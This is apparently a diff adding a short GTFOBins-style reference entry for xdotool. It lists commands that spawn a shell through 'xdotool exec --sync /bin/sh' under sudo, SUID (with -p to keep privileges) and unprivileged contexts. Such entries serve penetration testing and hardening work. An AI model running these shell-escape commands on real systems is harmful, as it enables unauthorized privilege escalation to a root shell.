@@ -1,0 +1,14 @@
+xdotool
+=======
+
+Shell
+-----
+
+[Sudo]
+    xdotool exec --sync /bin/sh
+
+[SUID]
+    xdotool exec --sync /bin/sh -p
+
+[Unprivileged]
+    xdotool exec --sync /bin/sh
